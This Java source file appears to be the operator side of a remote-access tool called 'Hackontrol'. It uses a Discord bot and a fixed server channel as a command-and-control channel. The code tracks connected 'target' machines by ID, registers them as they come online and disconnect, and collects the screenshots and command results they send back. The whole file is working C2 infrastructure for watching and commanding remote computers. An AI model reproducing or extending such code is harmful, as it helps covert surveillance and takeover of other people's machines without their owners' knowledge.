package com.khopan.hackontrol;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import com.fasterxml.jackson.databind.node.ObjectNode;
import com.khopan.hackontrol.exception.AwaitReadyException;
import com.khopan.hackontrol.exception.GuildNotFoundException;
import com.khopan.hackontrol.exception.NoTextChannelException;
import com.khopan.hackontrol.network.Request;
import com.khopan.hackontrol.target.TargetListener;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.Message.Attachment;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	private final JDA bot;
	private final Guild guild;
	private final TextChannel channel;
	private final List<Target> targetList;
	private final Response response;

	final Request request;

	private TargetListener listener;

	public Hackontrol() {
		this.bot = JDABuilder.createDefault(Token.BOT_TOKEN)
				.enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT)
				.addEventListeners(new Listener())
				.build();

		try {
			this.bot.awaitReady();
		} catch(InterruptedException | IllegalStateException Errors) {
			throw new AwaitReadyException("Error while awaitReady()", Errors);
		}

		this.guild = this.bot.getGuildById(1173967259304198154L);

		if(this.guild == null) {
			throw new GuildNotFoundException("Hackontrol guild not found");
		}

		List<TextChannel> channels = this.guild.getTextChannels();

		if(channels.isEmpty()) {
			throw new NoTextChannelException("No text channel found in Hackontrol guild");
		}

		this.channel = channels.get(0);

		if(this.channel == null) {
			throw new NullPointerException("Channel is null");
		}

		this.targetList = new ArrayList<>();
		this.request = new Request(this.channel);
		this.response = new Response(this);
		this.request.statusQuery();
	}

	public TargetListener getTargetListener() {
		return this.listener;
	}

	public void setTargetListener(TargetListener listener) {
		this.listener = listener;
	}

	public List<Target> getActiveTargets() {
		return Collections.unmodifiableList(this.targetList);
	}

	void statusReport(MachineId identifier, ObjectNode node) {
		boolean online = false;

		if(node.has("online")) {
			online = node.get("online").asBoolean(false);
		}

		if(online) {
			if(this.hasIdentifier(identifier)) {
				return;
			}

			this.spawnTarget(identifier);
			return;
		}

		if(!this.hasIdentifier(identifier)) {
			return;
		}

		this.removeTarget(identifier);
	}

	void screenshotTaken(MachineId identifier, Attachment attachment) {
		Target target = this.getTarget(identifier);

		if(target == null) {
			return;
		}

		target.screenshotTaken(attachment);
	}

	void commandResult(MachineId identifier, String result) {
		Target target = this.getTarget(identifier);

		if(target == null) {
			return;
		}

		target.commandResult(result);
	}

	private boolean hasIdentifier(MachineId identifier) {
		for(int i = 0; i < this.targetList.size(); i++) {
			Target target = this.targetList.get(i);

			if(target.getMachineIdentifier().equals(identifier)) {
				return true;
			}
		}

		return false;
	}

	private void spawnTarget(MachineId identifier) {
		Target target = new Target(this, identifier);
		this.targetList.add(target);

		if(this.listener != null) {
			new Thread(() -> this.listener.onTargetConnected(target)).start();
		}
	}

	private void removeTarget(MachineId identifier) {
		for(int i = 0; i < this.targetList.size(); i++) {
			Target target = this.targetList.get(i);

			if(target.getMachineIdentifier().equals(identifier)) {
				this.targetList.remove(i);
				target.connected = false;

				if(this.listener != null) {
					new Thread(() -> this.listener.onTargetDisconnected(target)).start();
				}

				return;
			}
		}
	}

	private Target getTarget(MachineId identifier) {
		for(int i = 0; i < this.targetList.size(); i++) {
			Target target = this.targetList.get(i);

			if(target.getMachineIdentifier().equals(identifier)) {
				return target;
			}
		}

		return null;
	}

	private class Listener extends ListenerAdapter {
		@Override
		public void onMessageReceived(MessageReceivedEvent Event) {
			Message message = Event.getMessage();
			String text = message.getContentDisplay();
			List<Attachment> attachmentList = message.getAttachments();

			if(!text.isEmpty()) {
				Hackontrol.this.response.parse(text, attachmentList);
				return;
			}

			attachmentList.remove(0);
			Attachment attachment = attachmentList.get(0);

			new Thread(() -> {
				String content;

				try {
					InputStream inputStream = attachment.getProxy().download().get();
					ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

					while(true) {
						int data = inputStream.read();

						if(data == -1) {
							break;
						}

						outputStream.write(data);
					}

					content = new String(outputStream.toByteArray(), StandardCharsets.UTF_8);
				} catch(Throwable ignored) {
					return;
				}

				Hackontrol.this.response.parse(content, attachmentList);
			}).start();
		}
	}
}
